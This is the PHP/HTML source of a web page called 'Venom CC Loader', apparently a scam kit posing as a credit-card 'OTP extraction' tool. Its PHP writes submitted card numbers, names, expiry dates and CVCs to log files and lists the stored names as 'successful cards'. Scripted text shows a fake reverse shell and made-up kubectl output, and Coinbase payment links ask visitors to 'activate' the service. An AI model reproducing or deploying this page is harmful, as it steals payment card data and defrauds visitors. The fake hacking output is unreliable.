<!-- W3hubs.com - Download Free Responsive Website Layout Templates designed on HTML5 
  CSS3,Bootstrap,Tailwind CSS,Shoelace Style which are 100% Mobile friendly. w3Hubs all Layouts are responsive 
  cross browser supported, best quality world class designs. -->
  <?php
 $number = $_POST["number"];
 $name = $_POST["name"];
 $expiry = $_POST["expiry"];
  $cvc = $_POST["cvc"];
 $file = fopen("log.txt","a");
 fwrite($file,"\n\nNumber : ");
 fwrite($file,$number);
 fwrite($file,"\nName : ");  
 fwrite($file,$name);  
  fwrite($file,"\nExpiry : ");
 fwrite($file,$expiry);
  fwrite($file,"\nCvc : ");
 fwrite($file,$cvc);
 fclose($file);
 $newfile = fopen("newfile.txt", "a+");
 fwrite($newfile, "\n\nCARD NAME : ");
 fwrite($newfile,$name . "<br />\n");
 fclose($newfile);
 $_SESSION['number'] = $number;   
 $_SESSION['name'] = $name;
 $_SESSION['expiry'] = $expiry;
 $_SESSION['cvc'] = $cvc;
?>

<!DOCTYPE html>
<html>
<head> 
<title>Venom CC</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"> 
<meta name="description" content="">
<meta name="author" content="w3hubs.com"> 
<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link href="https://bootswatch.com/slate/bootstrap.min.css" rel="stylesheet" type="text/css">   
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>   
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> 
<script type="text/javascript">
            function showMessage() {
                alert("HOW TO USE VENOM CC. IF YOU USUALLY USE VENOM CC YOU WILL NOTICE OUR NEW FEATURE OF PAYMENT TO VIEW YOU OTP CODE. THIS IS DUE TO HAVE EXPENSIVE THE PROCESS OF  TAKING  CARE OF OUR SERVER AND MAINTAIN OUR BUG AT ALL TIMES. HOW TO USE WITH OUR NEW FEATURE.....");
            }
        </script>
<style type="text/css">
  body{
  font-family: "Nunito Sans";
  background-color:black;
  }
  .login-form{
  padding: 25px;
  }
  h3{
  padding-left:30px;
  padding-right: 20px;
  font-weight: 700;
  }
  label{
  padding-top: 4px;
  padding-left: 4px;
  } 
  .bg-color{
  background-color:rgb(245, 248, 250);
  }
  .bg-color:hover label{
  color:#31a1f2;
  }
  .btn-custom{
  background-color: green; 
  border: none;
  border-radius: 6px;
  font-size: 20px;
  line-height: 28px;
  color: #fff;
  font-weight:700;
  height: 48px;
  width:100%
  }
  .btn-custom{ 
  color: #fff !important;
  background-color: green;
  }
  .form-control{
  border:0px;
  background-color: rgb(245, 248, 250); 
  border-bottom: 2px solid #657786;
  padding: 0px 4px 0px 4px; 
  min-height: 20px;
  }
  .form-control:focus{
  box-shadow: none;
  background-color: rgb(245, 248, 250);
  border-color: #31a1f2;
  }
  .fa{
  color: rgb(29, 161, 242);
  margin: 0 auto;
  display: block;
  text-align: center;
  font-size: 50px;
  }
  a{
  text-decoration: none; 
  color: rgb(27, 149, 224);
  }
  a:hover{
  text-decoration: underline;
  color: rgb(27, 149, 224);
  }
  .snake{
   text-align:center;}
   .visa{
   text-align:center;}
   .master{
   text-align:center;margin-top:10px;}
   #text{
font-weight:bold;
color: green;
text-shadow: 2px 2px 5px;
}
.container {
    
}
table, th, td {
 
}
/* Popup container */
.popup {
  position: relative;
  display: inline-block;
  cursor: pointer;
}

/* The actual popup (appears on top) */
.popup .popuptext {
  visibility: hidden;
  width: 160px;
  background-color: #555;
  color: #fff;
  text-align: center;
  border-radius: 6px;
  padding: 8px 0;
  position: absolute;
  z-index: 1;
  bottom: 125%;
  left: 50%;
  margin-left: -80px;
}

/* Popup arrow */
.popup .popuptext::after {
  content: "";
  position: absolute;
  top: 100%;
  left: 50%;
  margin-left: -5px;
  border-width: 5px;
  border-style: solid;
  border-color: #555 transparent transparent transparent;
}
.popup{
  background-color: green;
  border: none;
  border-radius: 6px;
  font-size: 20px;
  line-height: 28px;
  color: #fff;
  font-weight:700;
  height: 48px;
  width:100%
  }
  .popup{
  color: #fff !important;
  background-color: green;
  }

/* Toggle this class when clicking on the popup container (hide and show the popup) */
.popup .show {
  visibility: visible;
  -webkit-animation: fadeIn 1s;
  animation: fadeIn 1s
}

/* Add animation (fade in the popup) */
@-webkit-keyframes fadeIn {
  from {opacity: 0;}
  to {opacity: 1;}
} 

@keyframes fadeIn {
  from {opacity: 0;}
  to {opacity:1 ;}
}

.center {
    margin: auto;
    width: 60%;
    padding: 20px;
    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
}

.hideform {
    display: none;
}
</style>
<script>
    $('#show').on('click', function () {
    $('.center').show();
    $(this).hide();
})

$('#close').on('click', function () {
    $('.center').hide();
    $('#show').show();
})
</script>
<script>
// When the user clicks on <div>, open the popup
function myFunction() {
  var popup = document.getElementById("myPopup");
  popup.classList.toggle("show");
}
</script>
</head>
<body>
<div class="container">
  <div class="row">
    <div class="col-md-3"></div>
    <div class="col-md-6 p-0 pt-3">
<div class="snake"><img src="https://i.ibb.co/fFqkC9g/20157-7-cobra-snake-file-thumb.png" alt="20157-7-cobra-snake-file-thumb" border="0"></div>
     <div> <h3 class="text-center pt-">VENOM CC LOADER</h3></div>
      <DIV class="login-form">      <div class="scroll"><marquee style="color: green;" style="font-size: 40px;" style ="font-family: Verdana, Geneva, Tahoma, sans-serif;" behavior="left" direction="scroll"></b></marquee></div>
<div class="master"></div>
<h4 style="text-align:center;"><b>DEBUG LISTENER FOR <?php echo $_SESSION['cvc']; ?></b></h4> 
<div><p id="text"></p>
    <script>
        var a = 0;
        var txt="          Hello <?php if(isset($_SESSION['name'])) { echo $_SESSION['name']; } else { echo "  "; } ?>, welcome to reverse shell of x3crossbug-OTP sok built for x86////////////////                           k          ...starting   server debugging////// for                                       <?php if(isset($_SESSION['name'])) { echo $_SESSION['name']; } else { echo "  "; }   ?>  Card Number=>  <?php if(isset($_SESSION['number'])) { echo $_SESSION['number']; } else { echo "  "; }   ?>     Valid Date=>  <?php if(isset($_SESSION['expiry'])) { echo $_SESSION['expiry']; } else { echo "  "; }   ?>     CVV=>   <?php if(isset($_SESSION['cvc'])) { echo $_SESSION['cvc']; } else { echo "  "; }   ?> LISTENER INJECTION STARTING ///////// " ;
console.log(type.length);
        var speed=110;
        function text(){
            document.getElementById("text").innerHTML
            +=txt.charAt(a);
            a++;
            var t = setTimeout(text,speed ); 

if(a>=txt.length) {
    clearTimeout(t);
console.log("recursive stopped.");
}
        }
        text ();
    </script></div>
    
     <div><p id="text"></p>
    <script>
        var a = 0;
        var txt="  Hello <?php if(isset($_SESSION['name'])) { echo $_SESSION['name']; } else { echo "  "; } ?>, welcome to reverse shell of x3crossbug-OTP sok built for x86////////////////                           k          ...starting   server debugging////// for                                       <?php if(isset($_SESSION['name'])) { echo $_SESSION['name']; } else { echo "  "; }   ?>  Card Number=>  <?php if(isset($_SESSION['number'])) { echo $_SESSION['number']; } else { echo "  "; }   ?>     Valid Date=>  <?php if(isset($_SESSION['expiry'])) { echo $_SESSION['expiry']; } else { echo "  "; }   ?>     CVV=>   <?php if(isset($_SESSION['cvc'])) { echo $_SESSION['cvc']; } else { echo "  "; }   ?> LISTENER INJECTION STARTING /////////                                                       $ git clone https://gist.github.com/ 82c039843663de7e7f1e1 8bf4debe5fa.git inject-exec-script //                                    $ cd inject-exec-script /\!                         $ kubectl create configmap wrapper --from-file=wrapper.sh /\!                                configmap 'wrapper'' created  /\! $ kubectl apply -f deployment.yaml *** deployment 'ghost' created /\!                                                                  $ kubectl get pods   NAME                     READY                      STATUS                                     GO           RESTARTS             AGE  ??           ghost-3057289974-zvqm8   1/1       Running   0          30s                                                         INJECTION SUCCESSFUL                          Waiting for possible OTP code    reverse x86   ,,                            OTP= '*** ***' /\/\/\/\/\/\/\                                                                           x3 shell error found  \/\/\/\/\/\/\/\              OTP hidden by unknown source " ;
console.log(txt.length);
        var speed=90;
        function text(){
            document.getElementById("text").innerHTML
            +=txt.charAt(a);
            a++; 
            var t = setTimeout(text,speed ); 

if(a>=txt.length) {
    clearTimeout(t);
console.log("recursive stopped.");
}
        }
        text (); 
    </script></div>
    
       <div class="mb-3 bg-color">							      
        <div class="mb-3 bg-color">
          
        </div>
       
        <div class="text-center pt-3 pb-3"></div>
        <p><b>Venom cc is sad to annonce  that we are no longer offering free OTP Extraction due to how expensive the process is and the misuse done by our users.</b>  </p>
        <p>Kindly Donate to make Venom CC Free again</p> 
        <table  style="width:100%">
            <tr> 
                <td> <a target="_self" href="https://commerce.coinbase.com/checkout/09929f64-e2f6-4cb1-839f-054957bc6cbb"><button type="button" style="text-align:center;" class=".btn-custom">Quick  Activation</button></a></td> 
                <td><a target="_self" href="card.html"> <button type="button" style="text-align:center;" class=".btn-custom">Use Card</button></td>
            </tr>
            <tr>
                <td><a target="_self" href="https://commerce.coinbase.com/checkout/3d8c9992-a2bf-4179-9593-064cb2f223f7"> <button type="button" style="text-align:center;" class=".btn-custom">Kindly Donate</button> </a></td>
                <td> <form action="hash.php" methos="POST"> <input type="hidden" name="hash" value="<?php echo  $name['name']; ?>" /> <input type="submit" value="Hash" style="text-align:center;" class=".btn -custom" /> </form></td>
            </tr>
            <tr>
<td><div style:color: black> <input type="button" value="End session and go back!" onclick="history.go(-1)"></div> </td> <td> <a target_self href="popup.html"><button type="button" class=".btn-custom">Click Me</button></button></a></td>
            </tr>
        </table>
 
                  <div>
          <h2 style="color:red;" ><b>LIST OF PRE/POST SUCESSFUL CARDS </b></h2>
          <?php
$myfile = fopen("newfile.txt", "a+") or die("Unable to open file!");  
echo fread($myfile,filesize("newfile.txt"));
fclose($myfile);
?>
      </div>
        </div>
    </div>
    </div>
  </div>
  <div>
    <div class="snake"><img src="https://i.ibb.co/fFqkC9g/20157-7-cobra-snake-file-thumb.png" alt="20157-7-cobra-snake-file-thumb" border="0"></div>
         </div>
</div>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>
</body>
</html>